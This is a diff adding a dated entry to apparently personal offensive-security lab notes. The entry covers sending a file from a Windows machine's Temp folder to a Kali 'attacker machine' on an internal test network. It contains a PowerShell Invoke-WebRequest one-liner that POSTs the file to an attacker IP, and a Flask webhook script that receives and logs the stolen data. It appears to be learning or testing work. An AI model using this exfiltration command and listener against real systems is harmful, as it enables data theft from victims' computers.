@@ -860,3 +860,61 @@ Working:
 *Sending the keypresses as POST requests to server?*
 
 ---
+### 26.10.2023
+*Sending file(s) from powershell to simple webserver in Linux*
+
+
+I made a `testfile.txt` to good old "Temp"
+![](notes_res/notes-%2013.png)
+
+The setup itself is the same again:
+- Windows 10
+- Kali Linux
+And both are assigned to the same internal network for testing purposes.
+
+POST request to web server:
+```bash
+powershell Invoke-WebRequest -Uri http://192.168.66.2/server -Method POST -ContentType 'text/plain' -InFile ""`$env`:temp\testfile.txt""
+```
+
+Where `192.168.66.2` is the actual ip of the attacker machine and `/server` will be the webhook endpoint.
+
+Simple server script, using Flask, on attacker machine:   
+```python
+#!/bin/python3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/server', methods=['POST'])
+def handle_webhook():
+   if request.method == 'POST':
+       data = request.data
+       print("Received data:", data.decode("utf-8"))
+       return "Webhook data received", 200
+   else:
+       return "Unsupported method", 501
+
+if __name__ == '__main__':
+   app.run(host='192.168.66.2', port=80)
+```
+
+Running:   
+![](notes_res/notes-%2014.png)
+
+Sending:   
+![](notes_res/notes-%2015.png)
+
+And received:   
+![](notes_res/notes-%2016.png)
+
+To write the data automatically to file, i modified the webhook script:   
+![](notes_res/notes-%2017.png)
+
+Same tests again: Run, Execute, Receive, Check:   
+![](notes_res/notes-%2018.png)
+
+**Working.**
+
+
+
